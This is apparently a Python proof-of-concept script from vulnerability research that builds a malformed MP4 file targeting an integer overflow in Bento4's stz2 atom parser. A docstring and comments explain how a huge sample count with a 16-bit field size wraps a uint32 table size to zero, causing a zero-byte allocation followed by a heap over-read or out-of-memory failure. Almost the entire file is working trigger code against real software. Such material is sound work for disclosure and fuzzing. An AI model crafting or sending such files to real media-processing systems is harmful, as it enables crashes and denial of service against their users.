#!/usr/bin/env python3
"""
VULN 001 - stz2 integer overflow: sample_count * m_FieldSize → heap buffer over-read
File: Ap4Stz2Atom.cpp lines 88-120

Trigger:
  sample_count=0x10000000, m_FieldSize=16
  table_size = (0x10000000 * 16 + 7) / 8
             = (0x100000000 + 7) / 8   ← uint32_t overflow: 0x100000000 truncates to 0
             = (0 + 7) / 8 = 0
  buffer = new unsigned char[0]        ← 0-byte allocation
  Loop 0x10000000 times reading buffer[i*2] ← heap over-read (or OOM from SetItemCount)
"""
import struct
import os

POC_DIR = '/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4File_h'


def make_box(type_str, payload):
    """Build a standard 8-byte-header box."""
    size = 8 + len(payload)
    return struct.pack('>I', size) + type_str.encode('latin-1') + payload


def make_fullbox(type_str, version, flags, payload):
    """Build a FullBox (version + 3-byte flags after size+type)."""
    hdr = struct.pack('>B', version) + struct.pack('>I', flags)[1:]  # 1B version + 3B flags
    return make_box(type_str, hdr + payload)


# ── stz2 atom (the malicious one) ─────────────────────────────────────────────
# Layout after FullBox header (size=4B, type=4B, version=1B, flags=3B):
#   reserved[3]  = 0x00 0x00 0x00
#   field_size   = 0x10 (16)
#   sample_count = 0x10000000  (268,435,456)
#
# Vulnerability: table_size = (0x10000000 * 16 + 7) / 8
#                            = (0x100000000 + 7) / 8   ← uint32_t wraps to 0
#                            = 0
# m_Entries.SetItemCount(0x10000000) → tries to alloc ~1 GB → OOM / bad_alloc
# If alloc succeeds: buffer=new char[0], loop reads buffer[i*2] for 268M iters → OOB
stz2_payload = (
    b'\x00\x00\x00'                         # reserved (3 bytes)
    + struct.pack('B', 16)                   # field_size = 16
    + struct.pack('>I', 0x10000000)          # sample_count = 0x10000000
)
stz2 = make_fullbox('stz2', 0, 0, stz2_payload)

# ── container chain: stbl → minf → mdia → trak → moov ────────────────────────
stbl = make_box('stbl', stz2)
minf = make_box('minf', stbl)
mdia = make_box('mdia', minf)
trak = make_box('trak', mdia)
moov = make_box('moov', trak)

# ── ftyp ──────────────────────────────────────────────────────────────────────
ftyp = make_box('ftyp',
    b'mp42'                   # major_brand
    + struct.pack('>I', 0)    # minor_version
    + b'mp42'                 # compatible_brands
)

mp4_data = ftyp + moov

output_path = os.path.join(POC_DIR, 'vuln_001.mp4')
with open(output_path, 'wb') as f:
    f.write(mp4_data)

print(f'[+] Written {len(mp4_data)} bytes to {output_path}')
print(f'[+] ftyp size  : {len(ftyp)}')
print(f'[+] moov size  : {len(moov)}')
print(f'[+] stz2 size  : {len(stz2)}')
print(f'[+] sample_count = 0x10000000, field_size = 16')
print(f'[+] Expected: uint32_t overflow → table_size=0 → OOM or OOB read')
